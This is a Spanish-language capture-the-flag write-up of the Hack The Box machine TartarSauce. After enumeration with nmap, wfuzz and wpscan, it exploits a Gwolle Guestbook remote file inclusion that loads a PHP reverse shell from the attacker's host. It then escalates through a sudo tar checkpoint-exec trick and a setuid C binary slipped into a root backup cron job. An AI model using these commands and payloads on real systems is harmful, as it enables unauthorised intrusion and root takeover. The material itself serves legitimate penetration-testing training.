---
layout: post
title:  "OSCP Path ~ TartarSauce de Hack The Box (Necesario VIP)"
description: Writeup de la maquina de HackTheBox llamada TTARTARSAUCE siguiendo el PATH para el OSCP
tags: HTB, OSCP Path, Wordpress, Wpscan, Plugins, Gwolle, tar, python, Maquinas Retiradas, Writeup, Hacking
---

# TartarSauce ~ Hack The Box to OSCP

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.88       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing Page
```
Lanzamos la herramienta `Whatweb`
```bash
http://10.10.10.88:80 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.88], Title[Landing Page]
```

Procedemos a enumerar los directorios encontrados en busca de rutas alternativas.
Encontramos que para la ruta `http://10.10.10.88/webservices/` nos devuelve un `FORBIDEN`
Procedemos a Fuzzear por ahi con la herramienta `Wfuzz`
```bash
# wfuzz -c -L --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.88/webservices/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.88/webservices/FUZZ
Total requests: 220547

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                            
=====================================================================

000000780:   200        197 L    567 W      11237 Ch    "wp"
```
Apuntamos a esta ruta desde el navegador y vemos que tenemos un `Wordpress` asique vamos a proceder a enumerarlo bien con la herramienta `wpscan`
```bash
# wpscan --url http://10.10.10.88/webservices/wp -e ap --plugins-detection mixed 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.10.88/webservices/wp/ [10.10.10.88]
[+] Started: Tue Aug  3 19:06:27 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.10.88/webservices/wp/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://10.10.10.88/webservices/wp/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.10.88/webservices/wp/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.4'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/, Match: 'WordPress 4.9.4'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive and Aggressive Methods)
2021-08-03 19:38:01 VERIFY OK: depth=1, C=UK, ST=City, L=London, O=HackTheBox, CN=HackTheBox CA, name=htb, emailAddress=info@hackthebox.eu451) 99.00%  ETA: 00:00:19
2021-08-03 19:38:01 VERIFY KU OK                                                                                                                                    
2021-08-03 19:38:01 Validating certificate extended key usage                                                                                                       
2021-08-03 19:38:01 ++ Certificate has EKU (str) TLS Web Server Authentication, expects TLS Web Server Authentication                                               
2021-08-03 19:38:01 VERIFY EKU OK                                                                                                                                   
2021-08-03 19:38:01 VERIFY OK: depth=0, C=UK, ST=City, L=London, O=HackTheBox, CN=htb, name=htb, emailAddress=info@hackthebox.eu                                    
2021-08-03 19:38:01 Outgoing Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key================================ > (93520 / 94451) 99.01%  ETA: 00:00:19
2021-08-03 19:38:01 Incoming Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key                                                                        
2021-08-03 19:38:01 Control Channel: TLSv1.2, cipher TLSv1.2 ECDHE-RSA-AES256-GCM-SHA384, 2048 bit RSA                                                              
 Checking Known Locations - Time: 00:31:37 <================================================================================> (94451 / 94451) 100.00% Time: 00:31:37
[+] Checking Plugin Versions (via Passive and Aggressive Methods)                                                                                                   
                                                                                                                                                                    
[i] Plugin(s) Identified:                                                                                                                                           
                                                                                                                                                                    
[+] akismet                                                                                                                                                         
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/                                                                                          
 | Last Updated: 2021-07-06T20:28:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 4.1.10
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt

[+] brute-force-login-protection
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/
 | Latest Version: 1.5.3 (up to date)
 | Last Updated: 2017-06-29T10:39:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/, status: 403
 |
 | Version: 1.5.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt

"[+] gwolle-gb"
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
 | Last Updated: 2021-06-04T10:57:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | [!] The version is out of date, the latest version is 4.1.2
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200
 |
 | Version: 2.3.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Aug  3 19:38:15 2021
[+] Requests Done: 94492
[+] Cached Requests: 7
[+] Data Sent: 27.511 MB
[+] Data Received: 12.735 MB
[+] Memory used: 435.852 MB
[+] Elapsed time: 00:31:47


```

Buscamos por el `plugin Gwolle` en `Searchsploit`
```bash
# searchsploit Gwolle                                                                                                                                  
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
--------------------------------------------------------------------- ---------------------------------
WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion           | php/webapps/38861.txt
---------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
# Acceso Inicial - Plugin Gwolle Wordpress
Procedemos a seguir los pasos para ejecutar el `RFI` y ganar acceso a la maquina Victima
Atraves de la vulnerabilidad de Gwolle de wordpress 
Posteamos nuestro tipica `php-reverse-shell` en un archivito malicioso con nombre de `wp-load.php`
Procedemos a preparar la peticion para el acceso a nivel web que nos va a cargar nuestro archivo `wp-load.php`
```bash
http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.241/
```
Tenemos que postear nuestro archivo con un servidor con python3 para que se encuentre visible para la peticion de la maquina victima
```bash
Accedemos

hacemos sudo -l 
www-data@TartarSauce:/$ sudo -l
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```
Podemos usar como onuma el comando /tar
hacemos lo siguiente
```bash
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh  
```
Y ya nos spawneamos una shell como el usuario Onuma Yeahhh

# Escalada de Privilegios a Root
Encontramos que cada 5min se esta ejecutando este script por el user root
```bash

```

Procedemos a hechar un vistazo al script en si para ver que esta haciendo
```python
onuma@TartarSauce:/$ cat /usr/sbin/backuperer
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```
Paso 1 en nuestyro kali nos creamos una ruta de directorios /var/www/html con un archivo privesc
```bash
# tree                                  
.
├── privesc
├── privesc.c
├── privesc.tar.gz
└── var
    └── www
        └── html
            └── privesc
```
El archivo privesc es un archivo escrito en .C que compilamos  y damos estos permisos de ejecucion
```bash
# cat privesc.c                                                                                                                                               1 ⚙

int main() {
        setuid(0);
        system("/bin/bash -p");
}
```
Compilado en c
```bash
# gcc -m32 privesc.c -o privesc 
```
Le damos privilegios
```bash
# ls -l 
total 16
---S--Sr-x 1 root root 15524 ago  2 10:10 privesc		chmod 6005 privesc
```
Una vez pasamos de privesc.c al compilado privesc tenemos que comprimir el archivo para que nos quede el privesc.tar.gz
```bash
┌──(root💀pro)-[/home/…/Escritorio/HTB/TartarSauce/scrips]
└─# ls -la
total 36
drwxr-xr-x 3 root root  4096 ago  2 11:38 .
drwxr-xr-x 7 root root  4096 ago  1 10:42 ..
---S--Sr-x 1 root root 15524 ago  2 10:02 privesc
-rw-r--r-- 1 root root    53 ago  2 09:54 privesc.c
-rw-r--r-- 1 root root  2738 ago  2 11:38 privesc.tar.gz
drwxr-xr-x 3 root root  4096 ago  2 10:09 var
```
Comprimios el archivo desde la ruta
```bash
# tar -zcvf privesc.tar.gz var/www/html/        
var/www/html/
var/www/html/privesc
```

Procedemos a compartir nuestro archivo privesc.tar.gz para que cuando la tarea cron ejecute el scrip backuperer y saque el hash en el directorio /var/tmp/
```bash
┌──(root💀pro)-[/home/…/Escritorio/HTB/TartarSauce/scrips]
└─# nc -vlnp 4444 < privesc.tar.gz        
listening on [any] 4444 ...
connect to [10.10.16.241] from (UNKNOWN) [10.10.10.88] 49796
```
Rapidamente nosotros le hagamos el siguiente paso:
```bash
onuma@TartarSauce:/var/tmp$ ls -la
total 11284
drwxrwxrwt 10 root  root      4096 Aug  2 05:52 .
drwxr-xr-x 14 root  root      4096 Feb  9  2018 ..
"-rw-r--r--  1 onuma onuma 11511673 Aug  2 05:52 .5bff277d80d9f0c3d3df5e456214928b3eb07262     "
drwx------  3 root  root      4096 Feb 17  2018 systemd-private-46248d8045bf434cba7dc7496b9776d4-systemd-timesyncd.service-en3PkS
drwx------  3 root  root      4096 May 29  2020 systemd-private-4e3fb5c5d5a044118936f5728368dfc7-systemd-timesyncd.service-SksmwR
```
Procedemos a meter nuestro archivo comprimido y seteado en el hash en un margen de 30seg antes de que se borre
```bash
onuma@TartarSauce:/var/tmp$ nc 10.10.16.241 4444 > .5bff277d80d9f0c3d3df5e456214928b3eb07262
```

```
onuma@TartarSauce:/var/tmp$ ls -la
total 48
drwxrwxrwt 11 root  root  4096 Aug  2 05:53 .
drwxr-xr-x 14 root  root  4096 Feb  9  2018 ..
-rw-r--r--  1 onuma onuma 2738 Aug  2 05:53 .5bff277d80d9f0c3d3df5e456214928b3eb07262
" drwxr-xr-x  3 root  root  4096 Aug  2 05:53 check " 
drwx------  3 root  root  4096 Feb 17  2018 systemd-private-46248d8045bf434cba7dc7496b9776d4-systemd-timesyncd.service-en3PkS
drwx------  3 root  root  4096 May 29  2020 systemd-private-4e3fb5c5d5a044118936f5728368dfc7-systemd-timesyncd.service-SksmwR
```
Conseguimos entrar en la seccion del script de python que nos interesaba para poder alcanzar nuestro recurso compartido atraves de la ejeccucion de root del scrip visto
```bash
onuma@TartarSauce:/var/tmp/check$ cd var/www/html
onuma@TartarSauce:/var/tmp/check/var/www/html$ ls -la
total 24
drwxr-xr-x 2 root root  4096 Aug  2 04:10 .
drwxr-xr-x 3 root root  4096 Aug  2 05:53 ..
---S--Sr-x 1 root root 15524 Aug  2 04:10 privesc
onuma@TartarSauce:/var/tmp/check/var/www/html$ ./privesc 
root@TartarSauce:/var/tmp/check/var/www/html# whoami
root

root@TartarSauce:/var/tmp/check# cat /root/root.txt     
e79abdab8b8a4b64f857xxxxxxxxxxxx
```

Maquina Rootead =D !! Seguimos Full Hacks
